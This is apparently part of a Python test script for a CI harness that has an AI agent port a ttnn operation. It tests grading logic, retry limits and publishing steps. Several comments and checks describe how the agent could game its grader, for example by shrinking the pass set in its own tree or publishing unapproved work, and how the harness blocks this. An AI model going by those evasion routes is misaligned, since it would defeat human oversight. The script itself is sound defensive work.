_proto = {"status": "ok", "pass_ids": {"c[0]", "c[1]"}}

_graded = gate.grade_correctness(_results, _proto)
check("a case the prototype passes and the port fails blocks", _graded["failure_count"] == 1)
check("and it is named", [f["case_id"] for f in _graded["failures"]] == ["c[1]"], str(_graded["failures"]))
check("a case both fail is excused", _graded["prototype_gaps"] == ["c[2]"], str(_graded["prototype_gaps"]))
check("a case only the port passes is flagged, not failed", _graded["diverges_from_prototype"] == ["c[3]"])
check("must_pass counts only what the prototype serves", _graded["must_pass"] == 2, str(_graded["must_pass"]))
check("an unattributed in-scope failure fails the band", _graded["passes"] is False)

# The load-bearing one: a gap must not keep the band from passing, or the port is blamed for the
# generator's bugs and the bar becomes unreachable.
_no_defect = gate.grade_correctness([r for r in _results if r["case_id"] != "c[1]"], _proto)
check("a prototype gap alone still passes the band", _no_defect["passes"] is True, json.dumps(_no_defect))
check("and the gap is still reported", _no_defect["prototype_gap_count"] == 1)

# No usable pass set grades strictly. Every path that cannot produce one must land here, because the
# only safe way to be wrong about the bar is to be too harsh.
_strict = gate.grade_correctness(_results, None)
check("no pass set holds every in-scope case", _strict["failure_count"] == 2, str(_strict["failure_count"]))
check("and excuses nothing", _strict["prototype_gaps"] == [] and _strict["diverges_from_prototype"] == [])
check("and says the bar was not narrowed", _strict["must_pass"] is None)

# Out-of-scope routing is a separate question and the prototype has no bearing on it.
_routing = gate.grade_correctness(
    _results[:1] + [{"case_id": "c[9]", "scope": "out", "equal": True, "error": None, "routing_ok": False}],
    _proto,
)
check("a routing violation still fails, prototype or not", _routing["passes"] is False)
check("and is not counted as a correctness failure", _routing["failure_count"] == 0)

# A pass set measured against a different manifest or ledger is refused rather than trusted. Silently
# reusing one would grade this port against another op's sweep.
import tempfile as _tempfile  # noqa: E402

with _tempfile.TemporaryDirectory() as _tmp:
    _tmp = Path(_tmp)
    _manifest = _tmp / "untilize.yaml"
    _manifest.write_text("op: untilize\n")
    _cases = [{"case_id": "c[0]", "scope": "in"}, {"case_id": "c[1]", "scope": "in"}, {"case_id": "c[4]", "scope": "out"}]
    _in_scope = [c for c in _cases if c["scope"] == "in"]

    # measure.py writes the key; gate.py recomputes the two fields it can know on its own. They have
    # to agree, and nothing else in the system would notice if they stopped: a changed digest here
    # reads as a permanently stale pass set, which silently reverts the bar to the strict one.
    torch_stub = types.ModuleType("torch")
    for _name in ("bfloat16", "float32", "int32", "uint32", "uint16", "float16"):
        setattr(torch_stub, _name, f"torch.{_name}")
    sys.modules.setdefault("torch", torch_stub)
    for _name in ("float32", "int32", "uint32", "uint16", "bfloat4_b"):
        setattr(ttnn, _name, DataType(_name.upper()))
    ttnn.ROW_MAJOR_LAYOUT = "Layout.ROW_MAJOR"
    import measure  # noqa: E402

    _written = measure.prototype_key(str(_manifest), _in_scope)
    _expected = gate.expected_prototype_key(str(_manifest), _cases)
    check(
        "measure.py and gate.py agree on the pass-set key",
        all(_written[k] == v for k, v in _expected.items()),
        f"{_written} vs {_expected}",
    )
    check("the key does not depend on out-of-scope cases", "c[4]" not in json.dumps(_written))

    _good = _tmp / "prototype.json"
    _good.write_text(json.dumps({"available": True, "key": _written, "results": [
        {"case_id": "c[0]", "equal": True, "error": None},
        {"case_id": "c[1]", "equal": False, "error": None},
    ]}))
    _loaded = gate.load_prototype(str(_good), str(_manifest), _cases)
    check("a matching pass set is used", _loaded["status"] == "ok" and _loaded["pass_ids"] == {"c[0]"}, str(_loaded))

    _manifest.write_text("op: untilize\nchanged: yes\n")
    _stale = gate.load_prototype(str(_good), str(_manifest), _cases)
    check("a pass set for another manifest is refused", _stale["pass_ids"] is None and _stale["status"] == "stale")

    _unavailable = _tmp / "unavailable.json"
    _unavailable.write_text(json.dumps({"available": False, "unavailable_reason": "no generic", "results": []}))
    check(
        "an unavailable prototype excuses nothing",
        gate.load_prototype(str(_unavailable), str(_manifest), _cases)["pass_ids"] is None,
    )
    check("a missing file excuses nothing", gate.load_prototype(str(_tmp / "nope.json"), str(_manifest), _cases)["pass_ids"] is None)
    check("no path at all excuses nothing", gate.load_prototype("", str(_manifest), _cases)["pass_ids"] is None)

# The bar has to be measured somewhere the port cannot write, or shrinking it is the cheapest way to
# turn a failing port into a passing one. `--prototype` must therefore name a path outside the
# checkout, and the band that produces it must run in the same job that grades.
import re as _re  # noqa: E402

_steps = yaml.safe_load(WORKFLOW.read_text())["jobs"]["measure"]["steps"]
_verify = next(s for s in _steps if s.get("name") == "Verify the port")
_flag = _re.search(r"--prototype\s+(\S+)", _verify["run"])
check("verify grades against a prototype pass set", _flag is not None, "no --prototype in the verify step")
if _flag:
    check(
        "the pass set comes from outside the checkout",
        not _flag.group(1).startswith(("/work", ".", "$GITHUB_WORKSPACE")),
        f"{_flag.group(1)} is somewhere the agent's tree could reach",
    )
    _producer = next((s for s in _steps if "--band prototype" in str(s.get("run", ""))), None)
    check("and is produced in the same job that grades", _producer is not None)
    if _producer:
        check(
            "the producer writes where the grader reads",
            _flag.group(1) in _producer["run"],
            f"grader reads {_flag.group(1)}",
        )
        check(
            "and runs for verify, not only for the baseline",
            "baseline" not in str(_producer.get("if", "")),
            f"gated on {_producer.get('if')!r}",
        )

# --------------------------------------------------------------------------------------------
# Category derivation. `untilize` exists twice in the operations tree -- `data_movement/untilize` and
# `experimental/quasar/untilize`, identical down to the filenames -- so globbing for the op's name
# matched two directories and stopped the first resumed run before it began. The manifest's
# `native_entry` is the tiebreaker, and these cases are run against the real shell the workflow uses,
# because the first attempt at the sed chain returned `untilize` as the namespace and looked plausible.

_resolve = next(
    s for s in _frontmatter["steps"] if s["name"].startswith("Resolve the op")
)
_derive = _re.search(r"(rest=\$\{entry#ttnn\.\}.*?esac)", _resolve["run"], _re.S).group(1)

for _entry, _want in [
    ("ttnn.untilize", ""),
    ("ttnn.pad", ""),
    ("ttnn.experimental.quasar.untilize", "experimental/quasar"),
    ("ttnn.experimental.gather", "experimental"),
]:
    _got = subprocess.run(
        ["bash", "-c", f'entry="{_entry}"\n{_derive}\nprintf "%s" "$namespace"'],
        capture_output=True,
        text=True,
    ).stdout
    check(
        f"{_entry} yields namespace {_want!r}",
        _got == _want,
        f"got {_got!r}",
    )

# --------------------------------------------------------------------------------------------
# The agent job runs in-cluster now, and CIv2 sends loopback through the restricted proxy. gh-aw polls
# its own mcp-scripts server over `localhost:3000` to decide it is ready, so without the exemption the
# job dies before the agent exists -- and the error it dies with blames the server, which was fine.

if not str(_frontmatter["runs-on"]).startswith("ubuntu-latest"):
    _exempt = next(
        (s for s in _frontmatter["pre-steps"] if "no_proxy" in str(s.get("run", ""))),
        None,
    )
    check(
        "an in-cluster agent job exempts loopback from the cluster proxy",
        _exempt is not None,
        f"runs-on is {_frontmatter['runs-on']!r} and nothing sets no_proxy",
    )
    if _exempt:
        check(
            "and sets both spellings, because curl and node read different ones",
            "no_proxy=" in _exempt["run"] and "NO_PROXY=" in _exempt["run"],
        )
        check(
            "and appends rather than replacing the cluster services already there",
            "$no_proxy" in _exempt["run"],
            "dropping them breaks the image cache",
        )
        check(
            "and runs before gh-aw starts its own servers",
            _frontmatter["pre-steps"].index(_exempt) == 0,
            "a later step is too late for anything before it",
        )

# --------------------------------------------------------------------------------------------
# Bounded chaining. Run 3 spent eleven verifies and a whole job ceiling re-running a tree that could
# not improve, so every one of these is a loop that actually happened or one line away from it.


class _ChainArgs:
    def __init__(self, attempt=1, prev_failing=-1, max_attempts=6):
        self.attempt = attempt
        self.prev_failing = prev_failing
        self.max_attempts = max_attempts


check(
    "a win stops the chain",
    dispatch.should_chain("win", 0, _ChainArgs(attempt=2, prev_failing=5))[0] is False,
)
check(
    "the attempt cap stops the chain",
    dispatch.should_chain("back-to-translate", 3, _ChainArgs(attempt=6, prev_failing=9))[0] is False,
    "a sixth attempt under a six-attempt cap chained again",
)
check(
    "a blocked verdict stops the chain",
    dispatch.should_chain("blocked", None, _ChainArgs(attempt=2))[0] is False,
    "this is the exact loop run 3 died in",
)
check(
    "a falling failing count chains",
    dispatch.should_chain("back-to-translate", 4, _ChainArgs(attempt=2, prev_failing=9))[0] is True,
)
check(
    "a flat failing count stops the chain",
    dispatch.should_chain("back-to-translate", 9, _ChainArgs(attempt=2, prev_failing=9))[0] is False,
    "no progress, so the next attempt knows nothing new",
)
check(
    "a rising failing count stops the chain",
    dispatch.should_chain("back-to-translate", 11, _ChainArgs(attempt=2, prev_failing=9))[0] is False,
)
check(
    "a first attempt with nothing graded gets one more",
    dispatch.should_chain("back-to-translate", None, _ChainArgs(attempt=1, prev_failing=-1))[0] is True,
    "a fresh branch looks exactly like this and must be allowed to continue",
)
check(
    "but an ungraded second attempt does not",
    dispatch.should_chain("back-to-translate", None, _ChainArgs(attempt=2, prev_failing=4))[0] is False,
    "two runs in a row without a graded band is a loop, not progress",
)

# The reason is reported, not just the decision: a chain that stopped silently is indistinguishable
# from a chain that crashed, and that ambiguity cost a morning of reading logs.
for _verdict, _failing, _args in [
    ("win", 0, _ChainArgs()),
    ("blocked", None, _ChainArgs()),
    ("back-to-translate", 9, _ChainArgs(attempt=2, prev_failing=9)),
]:
    check(
        f"the {_verdict} decision explains itself",
        bool(dispatch.should_chain(_verdict, _failing, _args)[1]),
    )

# --------------------------------------------------------------------------------------------
# Publish is a post-step, and the two properties that make it trustworthy are structural: it runs
# where the agent cannot, and it runs whatever happened.

_post = _frontmatter["post-steps"]
_publish = next((s for s in _post if "--mode publish" in str(s.get("run", ""))), None)
check("the run publishes its work back to the branch", _publish is not None)
if _publish:
    check(
        "publishing does not depend on the verdict",
        str(_publish.get("if")) == "always()",
        f"gated on {_publish.get('if')!r}",
    )
    check(
        "publishing runs the launcher from outside the sandbox",
        "$HOME/.port-harness/" in _publish["run"],
    )
    # The last post-step destroys the credential publish authenticates with, so order is a
    # correctness property rather than a preference.
    _shredder = next(i for i, s in enumerate(_post) if "shred" in str(s.get("run", "")))
    check(
        "and before the step that shreds its credential",
        _post.index(_publish) < _shredder,
        "publish would have no token by the time it ran",
    )
check(
    "publish is not offered to the agent as a tool",
    not any("publish" in str(spec["run"]) for spec in _frontmatter["mcp-scripts"].values()),
    "an agent that can publish can publish work it was told not to",
)

# --------------------------------------------------------------------------------------------
# Resume keeps hand-written kernels. Overwriting them is a silent way to throw away a fix that a run
# just spent forty minutes proving on a card.

_resume_root = Path(tempfile.mkdtemp())
_src = _resume_root / "gen" / "kernels"
_src.mkdir(parents=True)
(_src / "writer.cpp").write_text("// template\n")
(_src / "reader.cpp").write_text("// template reader\n")
_op_dir = _resume_root / "ttnn" / "ops" / "myop"
(_op_dir / "codegen" / "kernels").mkdir(parents=True)
_edited = _op_dir / "codegen" / "kernels" / "writer.cpp"
_edited.write_text("// the fix a run spent forty minutes verifying\n")

_manifest = {"kernel_paths": ["gen/kernels/writer.cpp", "gen/kernels/reader.cpp"]}
_expected = scaffold.copy_kernels(_manifest, _resume_root, _op_dir, resume=True)
check(
    "resume keeps a kernel that was edited",
    _edited.read_text().startswith("// the fix"),
    "the previous attempt's work was overwritten by its template",
)
check(
    "resume still copies a kernel the manifest gained",
    (_op_dir / "codegen" / "kernels" / "reader.cpp").is_file(),
    "this is how a missing header cost 112 cases",
)
check(
    "and verify is still told about every kernel, not just the new ones",
    {p.name for p in _expected} == {"writer.cpp", "reader.cpp"},
    f"got {[p.name for p in _expected]}",
)
scaffold.copy_kernels(_manifest, _resume_root, _op_dir)
check(
    "without --resume a kernel is overwritten",
    # Not an exact match: a fresh copy is stamped with an SPDX header, so "verbatim" here means the
    # template's body replaced what was there, not that the bytes are identical.
    "// template" in _edited.read_text() and "the fix" not in _edited.read_text(),
    "the fresh-port path must keep taking the template",
)

print()
print(f"{len(failures)} failure(s)" + (": " + ", ".join(failures) if failures else ""))
sys.exit(1 if failures else 0)
